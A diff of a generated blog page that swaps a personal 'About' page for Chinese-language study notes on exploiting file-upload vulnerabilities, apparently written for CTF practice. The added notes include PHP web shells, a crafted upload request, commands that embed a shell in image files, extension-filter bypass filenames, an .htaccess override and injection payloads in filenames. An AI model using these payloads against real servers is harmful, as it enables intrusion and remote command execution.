@@ -8,14 +8,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>About &middot; hokak&#39;s Notes</title>
-  <meta name="title" content="About &middot; hokak&#39;s Notes" />
-  
-  <meta name="description" content="about me" />
+  <title>File Upload Vulnerability &middot; hokak&#39;s Notes</title>
+  <meta name="title" content="File Upload Vulnerability &middot; hokak&#39;s Notes" />
   
   
   
-  <link rel="canonical" href="http://localhost:1313/about/" />
+  
+  
+  <link rel="canonical" href="http://localhost:1313/notes/web/file-upload-vulnerbility/" />
   
   
   
@@ -64,30 +64,33 @@
   
   
   
-  <meta property="og:url" content="http://localhost:1313/about/">
+  <meta property="og:url" content="http://localhost:1313/notes/web/file-upload-vulnerbility/">
   <meta property="og:site_name" content="hokak&#39;s Notes">
-  <meta property="og:title" content="About">
-  <meta property="og:description" content="about me">
+  <meta property="og:title" content="File Upload Vulnerability">
+  <meta property="og:description" content="文件上傳漏洞是指用戶上傳可能會造成危害的檔案(廢話">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
+    <meta property="article:section" content="notes">
+    <meta property="og:image" content="http://localhost:1313/notes/web/file-upload-vulnerbility/featured.png">
 
   
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="About">
-  <meta name="twitter:description" content="about me">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/notes/web/file-upload-vulnerbility/featured.png">
+  <meta name="twitter:title" content="File Upload Vulnerability">
+  <meta name="twitter:description" content="文件上傳漏洞是指用戶上傳可能會造成危害的檔案(廢話">
 
   
   <script type="application/ld+json">
   [{
     "@context": "https://schema.org",
     "@type": "Article",
-    "articleSection": "Homepage",
-    "name": "About",
-    "headline": "About",
-    "description": "about me",
-    "abstract": "whoami #\r我在社群上用的名字是 Dr.",
+    "articleSection": "Notes",
+    "name": "File Upload Vulnerability",
+    "headline": "File Upload Vulnerability",
+    
+    "abstract": "文件上傳漏洞是指用戶上傳可能會造成危害的檔案(廢話",
     "inLanguage": "en",
-    "url" : "http:\/\/localhost:1313\/about\/",
+    "url" : "http:\/\/localhost:1313\/notes\/web\/file-upload-vulnerbility\/",
     "author" : {
       "@type": "Person",
       "name": "hokak"
@@ -101,7 +104,7 @@
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "101"
+    "wordCount": "255"
   }]
   </script>
 
@@ -625,13 +628,32 @@
   
 
 
+
+
+    
+    
+
+    
+    
+
+    
+    
+
+    
+    
+
+
+
+
+
 <div id="hero" class="h-[150px] md:h-[200px]"></div>
 
 
 
+
     
-    <div class="fixed inset-x-0 top-0 h-[1000px] single_hero_background nozoom"
-    style="background-image:url(/about/background.png);">
+    <div id = 'background-container' class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
+    style="background-image:url();">
     
 
 
@@ -650,14 +672,36 @@
         background_blur.style.opacity = (scroll / 300)
     });
 </script>
+<script>
+    var svgPaths = [
+        
+            "img\/background\/1.svg",
+        
+            "img\/background\/2.svg",
+        
+            "img\/background\/3.svg",
+        
+            "img\/background\/4.svg",
+        
+    ];
 
+    function changeBackground() {
+        var randomIndex = Math.floor(Math.random() * svgPaths.length);
+        var randomImagePath = svgPaths[randomIndex];
+        document.getElementById('background-container').style.backgroundImage = "url(/" + randomImagePath + ")";
+    }
+
+    window.onload = function() {
+        changeBackground();
+    };
+</script>
   
   
 
   <header id="single_header" class="mt-5 max-w-prose">
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      About
+      File Upload Vulnerability
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -700,7 +744,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <span title="Reading time">1 min</span><span class="px-2 text-primary-500">&middot;</span>
+  <span title="Reading time">2 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
 <script type="text/javascript" src="/js/zen-mode.min.63c8a202661f4a2063fdc2706685d668e8ea3da613da2224e9da527e5876e4f53dcac39ab60732626fb4151feae5d430d0cf44731e5d3c726522fcc1519c1547.js" integrity="sha512-Y8iiAmYfSiBj/cJwZoXWaOjqPaYT2iIk6dpSflh25PU9ysOatgcyYm&#43;0FR/q5dQw0M9Ecx5dPHJlIvzBUZwVRw=="></script>
@@ -938,16 +982,49 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#whoami">whoami</a></li>
-    <li><a href="#how-to-find-me">How to find me</a></li>
-    <li><a href="#blog">Blog</a></li>
-    <li><a href="#experiences">Experiences</a>
+    <li><a href="#伺服器如何處理靜態檔案的request">伺服器如何處理靜態檔案的Request</a>
       <ul>
-        <li><a href="#ctf-experiences">CTF experiences</a></li>
-        <li><a href="#competitve-programming">Competitve Programming</a></li>
-        <li><a href="#activities">Activities</a></li>
+        <li><a href="#檔案路徑">檔案路徑</a></li>
+        <li><a href="#回傳的檔案內容">回傳的檔案內容</a></li>
       </ul>
     </li>
+    <li><a href="#web-shell">Web Shell</a>
+      <ul>
+        <li><a href="#任意讀取檔案">任意讀取檔案</a></li>
+        <li><a href="#執行指令">執行指令</a></li>
+      </ul>
+    </li>
+    <li><a href="#bypassing">Bypassing</a>
+      <ul>
+        <li><a href="#content-type">Content-Type</a></li>
+        <li><a href="#magic-number">magic number</a></li>
+        <li><a href="#副檔名驗證">副檔名驗證</a>
+          <ul>
+            <li><a href="#使用其他副檔名">使用其他副檔名</a></li>
+            <li><a href="#更改大小寫">更改大小寫</a></li>
+            <li><a href="#在增加更多副檔名層級">在增加更多副檔名層級</a></li>
+            <li><a href="#副檔名尾端加入特殊字元">副檔名尾端加入特殊字元</a></li>
+            <li><a href="#混淆副檔名parser">混淆副檔名parser</a></li>
+            <li><a href="#突破檔案名稱長度上限">突破檔案名稱長度上限</a></li>
+            <li><a href="#繞過反繞過">繞過反繞過</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#overriding-the-server-configuration">Overriding The Server Configuration</a>
+      <ul>
+        <li><a href="#apache">Apache</a></li>
+      </ul>
+    </li>
+    <li><a href="#filename-tricks">Filename Tricks</a>
+      <ul>
+        <li><a href="#path-travelsal">path travelsal</a></li>
+        <li><a href="#sql-injection">SQL injection</a></li>
+        <li><a href="#command-injection">command injection</a></li>
+        <li><a href="#xss">XSS</a></li>
+      </ul>
+    </li>
+    <li><a href="#reference">Reference</a></li>
   </ul>
 </nav>
   </div>
@@ -961,16 +1038,49 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#whoami">whoami</a></li>
-    <li><a href="#how-to-find-me">How to find me</a></li>
-    <li><a href="#blog">Blog</a></li>
-    <li><a href="#experiences">Experiences</a>
+    <li><a href="#伺服器如何處理靜態檔案的request">伺服器如何處理靜態檔案的Request</a>
       <ul>
-        <li><a href="#ctf-experiences">CTF experiences</a></li>
-        <li><a href="#competitve-programming">Competitve Programming</a></li>
-        <li><a href="#activities">Activities</a></li>
+        <li><a href="#檔案路徑">檔案路徑</a></li>
+        <li><a href="#回傳的檔案內容">回傳的檔案內容</a></li>
       </ul>
     </li>
+    <li><a href="#web-shell">Web Shell</a>
+      <ul>
+        <li><a href="#任意讀取檔案">任意讀取檔案</a></li>
+        <li><a href="#執行指令">執行指令</a></li>
+      </ul>
+    </li>
+    <li><a href="#bypassing">Bypassing</a>
+      <ul>
+        <li><a href="#content-type">Content-Type</a></li>
+        <li><a href="#magic-number">magic number</a></li>
+        <li><a href="#副檔名驗證">副檔名驗證</a>
+          <ul>
+            <li><a href="#使用其他副檔名">使用其他副檔名</a></li>
+            <li><a href="#更改大小寫">更改大小寫</a></li>
+            <li><a href="#在增加更多副檔名層級">在增加更多副檔名層級</a></li>
+            <li><a href="#副檔名尾端加入特殊字元">副檔名尾端加入特殊字元</a></li>
+            <li><a href="#混淆副檔名parser">混淆副檔名parser</a></li>
+            <li><a href="#突破檔案名稱長度上限">突破檔案名稱長度上限</a></li>
+            <li><a href="#繞過反繞過">繞過反繞過</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#overriding-the-server-configuration">Overriding The Server Configuration</a>
+      <ul>
+        <li><a href="#apache">Apache</a></li>
+      </ul>
+    </li>
+    <li><a href="#filename-tricks">Filename Tricks</a>
+      <ul>
+        <li><a href="#path-travelsal">path travelsal</a></li>
+        <li><a href="#sql-injection">SQL injection</a></li>
+        <li><a href="#command-injection">command injection</a></li>
+        <li><a href="#xss">XSS</a></li>
+      </ul>
+    </li>
+    <li><a href="#reference">Reference</a></li>
   </ul>
 </nav>
   </div>
@@ -1052,232 +1162,408 @@
 
 
         <div class="article-content max-w-prose mb-20">
-          
+          <p>文件上傳漏洞是指用戶上傳可能會造成危害的檔案(<del>廢話</del></p>
 
-<h2 class="relative group">whoami 
-    <div id="whoami" class="anchor"></div>
+
+<h2 class="relative group">伺服器如何處理靜態檔案的Request 
+    <div id="%E4%BC%BA%E6%9C%8D%E5%99%A8%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E9%9D%9C%E6%85%8B%E6%AA%94%E6%A1%88%E7%9A%84request" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#whoami" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#%E4%BC%BA%E6%9C%8D%E5%99%A8%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E9%9D%9C%E6%85%8B%E6%AA%94%E6%A1%88%E7%9A%84request" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
-<p>我在社群上用的名字是 <strong>Dr.dog</strong>，目前高二<br>
-常打ctf，主要玩reverse和pwn，crypto也有練過一陣子<br>
-以前是打競程的，不過也沒有碰很深<br>
-本職是諧咖兼宅男，夢想是work from home<br>
-平常三點睡，麻煩各位體諒一下我的肝;3<br>
-<del>睡死了就別叫了</del></p>
 
 
-<h2 class="relative group">How to find me 
-    <div id="how-to-find-me" class="anchor"></div>
+<h3 class="relative group">檔案路徑 
+    <div id="%E6%AA%94%E6%A1%88%E8%B7%AF%E5%BE%91" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#how-to-find-me" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#%E6%AA%94%E6%A1%88%E8%B7%AF%E5%BE%91" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>傳統的網站會把檔案的request，1:1的映射到自己的檔案路徑，如：</p>
+<pre tabindex="0"><code>GET /files/avatars/profile.png HTTP/1.1
+</code></pre><p><code>profile.png</code> 的絕對位置可能為<code>/var/www/html/files/avatars/profile.png</code></p>
+
+
+<h3 class="relative group">回傳的檔案內容 
+    <div id="%E5%9B%9E%E5%82%B3%E7%9A%84%E6%AA%94%E6%A1%88%E5%85%A7%E5%AE%B9" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E5%9B%9E%E5%82%B3%E7%9A%84%E6%AA%94%E6%A1%88%E5%85%A7%E5%AE%B9" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li>如果檔案類型為<code>non-executable</code>：伺服器會回傳檔案的內容</li>
+<li>如果檔案類型為<code>excutable</code>：伺服器會把request的header和parameter指派給對應的變數，並回傳執行的結果輸出</li>
+<li>如果檔案類型為<code>excutable</code>，但伺服器沒有設定要執行：大部分情況下會回傳error，但少部分情況會回傳檔案內容回來</li>
+</ul>
+
+
+<h2 class="relative group">Web Shell 
+    <div id="web-shell" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#web-shell" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
-<p>我比較不常使用instagram和line:(<br>
-有事可以在dc找到我，id:<code>hokak_</code>，加好友之前稍微自我介紹一下就ok了<br>
-比較正式的事可以找我email(頭像下方)</p>
+<p>如果使用者可以執行上傳的檔案，那麼這些檔案內容會造成危害</p>
 
 
-<h2 class="relative group">Blog 
-    <div id="blog" class="anchor"></div>
+<h3 class="relative group">任意讀取檔案 
+    <div id="%E4%BB%BB%E6%84%8F%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#blog" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#%E4%BB%BB%E6%84%8F%E8%AE%80%E5%8F%96%E6%AA%94%E6%A1%88" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/path/to/target/file&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div>
+
+<h3 class="relative group">執行指令 
+    <div id="%E5%9F%B7%E8%A1%8C%E6%8C%87%E4%BB%A4" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E5%9F%B7%E8%A1%8C%E6%8C%87%E4%BB%A4" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>用這樣的方式可以傳遞parameter給web shell：</p>
+<pre tabindex="0"><code>GET /example.com/exploit.php?command=id HTTP/1.1
+</code></pre>
+
+<h2 class="relative group">Bypassing 
+    <div id="bypassing" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#bypassing" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
-<p><del>建立blog的契機是因為懶得自我介紹</del><br>
-痾我需要一個blog來放筆記<br>
-比賽的時候copy自己的起來比較快<br>
-網站架構是用Hugo &amp; Blowfish<br>
-以後會不停的修改網站的外觀，(雖然我不是學網頁設計的，但我有強迫症)<br>
-也會把hackmd的東西搬過來<br>
-喔對，背景都是來自<a href="https://store.steampowered.com/app/1044620/_/" target="_blank">蒼之彼方四重奏</a>，蠻推這遊戲的</p>
 
 
-<h2 class="relative group">Experiences 
-    <div id="experiences" class="anchor"></div>
+<h3 class="relative group">Content-Type 
+    <div id="content-type" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#experiences" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#content-type" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>若是伺服器使用Content-Type驗證檔案</p>
+<pre tabindex="0"><code>POST /images HTTP/1.1
+Host: example.com
+Content-Length: 12345
+Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456
+
+---------------------------012345678901234567890123456
+
+Content-Disposition: form-data; name=&#34;image&#34;; filename=&#34;exploit.php&#34;
+Content-Type: image/png
+&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;
+
+---------------------------012345678901234567890123456
+Content-Disposition: form-data; name=&#34;username&#34;
+user
+
+---------------------------012345678901234567890123456-- 
+</code></pre><p>將<code>Content-Type</code>改成<code>image/png</code>或<a href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt" target="_blank">其他</a></p>
+
+
+<h3 class="relative group">magic number 
+    <div id="magic-number" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#magic-number" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>伺服器驗證檔案的header<br>
+利用exiftool:</p>
+<pre tabindex="0"><code>exiftool -Comment=&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34; img.jpg
+</code></pre><p>利用linux:</p>
+<pre tabindex="0"><code>echo &#39;&lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;&#39; &gt;&gt; img.png
+</code></pre>
+
+<h3 class="relative group">副檔名驗證 
+    <div id="%E5%89%AF%E6%AA%94%E5%90%8D%E9%A9%97%E8%AD%89" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E5%89%AF%E6%AA%94%E5%90%8D%E9%A9%97%E8%AD%89" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>如果遇到副檔名被擋的情況</p>
+
+
+<h4 class="relative group">使用其他副檔名 
+    <div id="%E4%BD%BF%E7%94%A8%E5%85%B6%E4%BB%96%E5%89%AF%E6%AA%94%E5%90%8D" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E4%BD%BF%E7%94%A8%E5%85%B6%E4%BB%96%E5%89%AF%E6%AA%94%E5%90%8D" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>以下副檔名之檔案為<code>executable</code></p>
+<ul>
+<li>PHP: <code>.php</code>, <code>.php2</code>, <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.php6</code>, <code>.php7</code>, <code>.phps</code>, <code>.phps</code>, <code>.pht</code>, <code>.phtm</code>, <code>.phtml</code>, <code>.pgif</code>, <code>.shtml</code>, <code>.htaccess</code>, <code>.phar</code>, <code>.inc</code>, <code>.hphp</code>, <code>.ctp</code>, <code>.module</code></li>
+<li>Working in PHPv8: <code>.php</code>, <code>.php4</code>, <code>.php5</code>, <code>.phtml</code>, <code>.module</code>, <code>.inc</code>, <code>.hphp</code>, <code>.ctp</code></li>
+<li>ASP: <code>.asp</code>, <code>.aspx</code>, <code>.config</code>, <code>.ashx</code>, <code>.asmx</code>, <code>.aspq</code>, <code>.axd</code>, <code>.cshtm</code>, <code>.cshtml</code>, <code>.rem</code>, <code>.soap</code>, <code>.vbhtm</code>, <code>.vbhtml</code>, <code>.asa</code>, <code>.cer</code>, <code>.shtml</code></li>
+<li>Jsp: <code>.jsp</code>, <code>.jspx</code>, <code>.jsw</code>, <code>.jsv</code>, <code>.jspf</code>, <code>.wss</code>, <code>.do</code>, <code>.action</code></li>
+<li>Coldfusion: <code>.cfm</code>, <code>.cfml</code>, <code>.cfc</code>, <code>.dbm</code></li>
+<li>Flash: <code>.swf</code></li>
+<li>Perl: <code>.pl</code>, <code>.cgi</code></li>
+<li>Erlang Yaws Web Server: <code>.yaws</code></li>
+</ul>
+
+
+<h4 class="relative group">更改大小寫 
+    <div id="%E6%9B%B4%E6%94%B9%E5%A4%A7%E5%B0%8F%E5%AF%AB" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E6%9B%B4%E6%94%B9%E5%A4%A7%E5%B0%8F%E5%AF%AB" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p><code>exploit.pHP</code></p>
+
+
+<h4 class="relative group">在增加更多副檔名層級 
+    <div id="%E5%9C%A8%E5%A2%9E%E5%8A%A0%E6%9B%B4%E5%A4%9A%E5%89%AF%E6%AA%94%E5%90%8D%E5%B1%A4%E7%B4%9A" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E5%9C%A8%E5%A2%9E%E5%8A%A0%E6%9B%B4%E5%A4%9A%E5%89%AF%E6%AA%94%E5%90%8D%E5%B1%A4%E7%B4%9A" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p><code>exploit.png.php</code>
+<code>exploit.php.png</code>
+<code>exploit.php%00.png%00.jpg</code></p>
+
+
+<h4 class="relative group">副檔名尾端加入特殊字元 
+    <div id="%E5%89%AF%E6%AA%94%E5%90%8D%E5%B0%BE%E7%AB%AF%E5%8A%A0%E5%85%A5%E7%89%B9%E6%AE%8A%E5%AD%97%E5%85%83" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E5%89%AF%E6%AA%94%E5%90%8D%E5%B0%BE%E7%AB%AF%E5%8A%A0%E5%85%A5%E7%89%B9%E6%AE%8A%E5%AD%97%E5%85%83" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<ul>
+<li><code>exploit.php%20</code></li>
+<li><code>exploit.php%0a</code></li>
+<li><code>exploit.php%00</code></li>
+<li><code>exploit.php%0d%0a</code></li>
+<li><code>exploit.php/</code></li>
+<li><code>exploit.php.\</code></li>
+<li><code>exploit.</code></li>
+<li><code>exploit.php....</code></li>
+<li><code>exploit.pHp5....</code></li>
+</ul>
+
+
+<h4 class="relative group">混淆副檔名parser 
+    <div id="%E6%B7%B7%E6%B7%86%E5%89%AF%E6%AA%94%E5%90%8Dparser" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E6%B7%B7%E6%B7%86%E5%89%AF%E6%AA%94%E5%90%8Dparser" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>使用多個副檔名、特殊字元和填充多個null byte混淆副檔名parser</p>
+<ul>
+<li><code>exploit.png.php</code></li>
+<li><code>exploit.png.pHp5</code></li>
+<li><code>exploit.php#.png</code></li>
+<li><code>exploit.php%00.png</code></li>
+<li><code>exploit.php\x00.png</code></li>
+<li><code>exploit.php%0a.png</code></li>
+<li><code>exploit.php%0d%0a.png</code></li>
+<li><code>exploit.phpJunk123png</code></li>
+</ul>
+
+
+<h4 class="relative group">突破檔案名稱長度上限 
+    <div id="%E7%AA%81%E7%A0%B4%E6%AA%94%E6%A1%88%E5%90%8D%E7%A8%B1%E9%95%B7%E5%BA%A6%E4%B8%8A%E9%99%90" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E7%AA%81%E7%A0%B4%E6%AA%94%E6%A1%88%E5%90%8D%E7%A8%B1%E9%95%B7%E5%BA%A6%E4%B8%8A%E9%99%90" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p><code>python -c 'print &quot;A&quot; * 232'</code> + <code>.php.jpg</code></p>
+
+
+<h4 class="relative group">繞過反繞過 
+    <div id="%E7%B9%9E%E9%81%8E%E5%8F%8D%E7%B9%9E%E9%81%8E" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E7%B9%9E%E9%81%8E%E5%8F%8D%E7%B9%9E%E9%81%8E" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p><code>exploit.p.phphp</code></p>
+
+
+<h2 class="relative group">Overriding The Server Configuration 
+    <div id="overriding-the-server-configuration" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#overriding-the-server-configuration" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">Apache 
+    <div id="apache" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#apache" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li>檢查<code>/etc/apache2/apache2.conf(或httpd.conf)</code>，確保server有允許使用.htaccess:</li>
+</ol>
+<pre tabindex="0"><code>&lt;Directory /path/to/your/directory&gt;
+    AllowOverride All
+&lt;/Directory&gt;
+</code></pre><ol start="2">
+<li>
+<p>上傳<code>.htaccess</code>於目前資料夾:<br>
+<code>AddType application/x-httpd-php evil</code></p>
+</li>
+<li>
+<p>上傳<code>expoilt.evil</code>，理論上會被當作php執行</p>
+</li>
+</ol>
+
+
+<h2 class="relative group">Filename Tricks 
+    <div id="filename-tricks" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#filename-tricks" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">path travelsal 
+    <div id="path-travelsal" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#path-travelsal" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>伺服器解析後檔案可能上傳於上層目錄<br>
+<code>..%2Fexploit.php</code></p>
+
+
+<h3 class="relative group">SQL injection 
+    <div id="sql-injection" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#sql-injection" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>此payload可以暫停延遲10秒的sql<br>
+<code>sleep(10)-- -.jpg</code></p>
+
+
+<h3 class="relative group">command injection 
+    <div id="command-injection" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#command-injection" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><code>; sleep 10;</code></p>
+
+
+<h3 class="relative group">XSS 
+    <div id="xss" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#xss" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><code>&lt;svg onload=alert(1)&gt;</code></p>
+
+
+<h2 class="relative group">Reference 
+    <div id="reference" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
